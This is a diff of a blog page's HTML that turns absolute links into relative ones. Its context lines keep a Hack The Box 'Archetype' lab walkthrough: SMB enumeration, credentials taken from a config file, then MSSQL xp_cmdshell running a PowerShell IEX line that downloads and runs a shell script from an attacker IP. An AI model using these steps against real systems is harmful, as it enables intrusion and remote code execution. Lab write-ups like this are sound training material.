@@ -30,17 +30,17 @@ smbclient -L \\10.10.10.27 -NIPC$: this hidden share is a special share used f
 
 
 
-<link rel="stylesheet" href="https://nmmorette.github.io/main.031a8efc33f94f55a4071bf4e91596478a5809fc8c148fab113801189cfd2152.css">
+<link rel="stylesheet" href="/main.031a8efc33f94f55a4071bf4e91596478a5809fc8c148fab113801189cfd2152.css">
 
 
 
 
-    <link rel="apple-touch-icon" sizes="180x180" href="https://nmmorette.github.io/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://nmmorette.github.io/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://nmmorette.github.io/favicon-16x16.png">
-    <link rel="manifest" href="https://nmmorette.github.io/site.webmanifest">
-    <link rel="mask-icon" href="https://nmmorette.github.io/safari-pinned-tab.svg" color="#1b1c1d">
-    <link rel="shortcut icon" href="https://nmmorette.github.io/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#1b1c1d">
+    <link rel="shortcut icon" href="/favicon.ico">
     <meta name="msapplication-TileColor" content="#1b1c1d">
     <meta name="theme-color" content="#1b1c1d">
 
@@ -122,7 +122,7 @@ if (!doNotTrack) {
         <div class="container">
             <header class="header">
     <span class="header__inner">
-        <a href="https://nmmorette.github.io/" style="text-decoration: none;">
+        <a href="/" style="text-decoration: none;">
     <div class="logo">
         
             <span class="logo__mark">&gt;</span>
@@ -140,7 +140,7 @@ if (!doNotTrack) {
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://nmmorette.github.io/whoami/">$whoami</a></li><li><a href="https://nmmorette.github.io/badges/">Badges</a></li><li><a href="https://nmmorette.github.io/posts/">Posts</a></li>
+    <ul class="menu__inner"><li><a href="/whoami/">$whoami</a></li><li><a href="/badges/">Badges</a></li><li><a href="/posts/">Posts</a></li>
     </ul>
 </nav>
 
@@ -209,19 +209,19 @@ if (!doNotTrack) {
 <br>
 
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/banner.png"  class="center"  style="border-radius: 10px;"  />
+    <img src="/images/htb/archetype/banner.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <h2 id="enumeration">Enumeration</h2>
 <p>Initial scan:</p>
 <pre><code class="language-cli" data-lang="cli"> nmap -sSV 10.10.10.27
 </code></pre>
-    <img src="https://nmmorette.github.io/images/htb/archetype/scan.png"  class="center"  style="border-radius: 10px;"  />
+    <img src="/images/htb/archetype/scan.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <p>Second nmap scan with <code>--script vuln</code></p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/vuln.png"  class="center"  style="border-radius: 10px;"  />
+    <img src="/images/htb/archetype/vuln.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <p>We found a possible starting point: CVE-2008-4250.</p>
@@ -229,14 +229,14 @@ if (!doNotTrack) {
 <p>The next step is to try to connect in the SMB service:</p>
 <pre><code class="language-cli" data-lang="cli"> smbclient -L \\10.10.10.27 -N
 </code></pre>
-    <img src="https://nmmorette.github.io/images/htb/archetype/smb.png"  class="center"  style="border-radius: 10px;"  />
+    <img src="/images/htb/archetype/smb.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <p><strong>IPC$:</strong> this hidden share is a special share used for inter-process communication. It doesn’t allow one to access files or directories like other shares, but rather allows one to communicate with processes running on the remote system.</p>
 <p><strong>backups:</strong> a normal share with read access. It lacks a comment which means it could contain interesting data if we’re able to connect to it.</p>
 <p>The backup folder it’s accessible without a password and insidi we have an interesting file: <code>prod.dtsConfig</code>.</p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/prod.png"  class="center"  style="border-radius: 10px;"  />
+    <img src="/images/htb/archetype/prod.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <p>Looking at the file we found a user and password.</p>
@@ -245,7 +245,7 @@ if (!doNotTrack) {
 <h2 id="mssqlclipy">mssqlcli.py</h2>
 <p>Using <code>mssqlcli.py</code> script with “-windows-auth” parameter to instruct the script to use Windows Authentication and the User ID and password found in the config file from before, I managed to get a connection to the exposed SQL server on port 1433.</p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/sql.png"  class="center"  style="border-radius: 8px;"  />
+    <img src="/images/htb/archetype/sql.png"  class="center"  style="border-radius: 8px;"  />
 
 
 <p>Now we need to enable code execution in this server:</p>
@@ -323,19 +323,19 @@ We only need to execute the payload in the target and wait for connection into t
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">xp_cmdshell <span style="color:#e6db74">&#34;powershell &#34;</span>IEX (New<span style="color:#f92672">-</span>Object Net.WebClient).DownloadString(<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#e6db74">&#34;http://10.10.16.113/shell2.ps1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">);&#34;</span>
 </code></pre></div><p>After that we have the shell:</p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/shell.png"  class="center"  style="border-radius: 8px;"  />
+    <img src="/images/htb/archetype/shell.png"  class="center"  style="border-radius: 8px;"  />
 
 
 <h2 id="first-key">First Key</h2>
 <p>For the first key we need to enumerate the files:</p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/key.png"  class="center"  style="border-radius: 10px;"  />
+    <img src="/images/htb/archetype/key.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <h2 id="privileged-user-access">Privileged user access</h2>
 <p>Now that we have the users' flag, we need to focus on the administrator flag. Maybe the flag is in the administrator’s folder, but our user don&rsquo;t have access. We need to privesc our shell. A very useful checklist to do that:  <a href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">Hacktricks</a>.</p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/checklist.png"  class="center"  style="border-radius: 10px;"  />
+    <img src="/images/htb/archetype/checklist.png"  class="center"  style="border-radius: 10px;"  />
 
 
 <p>One interesting point in the checklist is the Power Shell history.</p>
@@ -343,18 +343,18 @@ We only need to execute the payload in the target and wait for connection into t
 <code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code></p>
 <p>Let&rsquo;s take a look:</p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/history.png"  class="center"  style="border-radius: 8px;"  />
+    <img src="/images/htb/archetype/history.png"  class="center"  style="border-radius: 8px;"  />
 
 
 <p>Piece of cake, we have the admin credentials now.</p>
 <p>Let&rsquo;s use a <code>psexec</code> with the new credential to connect:</p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/psexec.png"  class="center"  style="border-radius: 8px;"  />
+    <img src="/images/htb/archetype/psexec.png"  class="center"  style="border-radius: 8px;"  />
 
 
 <p>Finally, we can look at the administrator&rsquo;s folder to find the second and last key:</p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/key2.png"  class="center"  style="border-radius: 8px;"  />
+    <img src="/images/htb/archetype/key2.png"  class="center"  style="border-radius: 8px;"  />
 
 
 <p>
@@ -366,7 +366,7 @@ We only need to execute the payload in the target and wait for connection into t
 <br>
 </p>
 
-    <img src="https://nmmorette.github.io/images/htb/archetype/pwnd.png"  class="center"  style="border-radius: 8px;"  />
+    <img src="/images/htb/archetype/pwnd.png"  class="center"  style="border-radius: 8px;"  />
 
 
 
@@ -565,7 +565,7 @@ We only need to execute the payload in the target and wait for connection into t
 
 
 
-<script type="text/javascript" src="https://nmmorette.github.io/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
+<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>
 
 
 
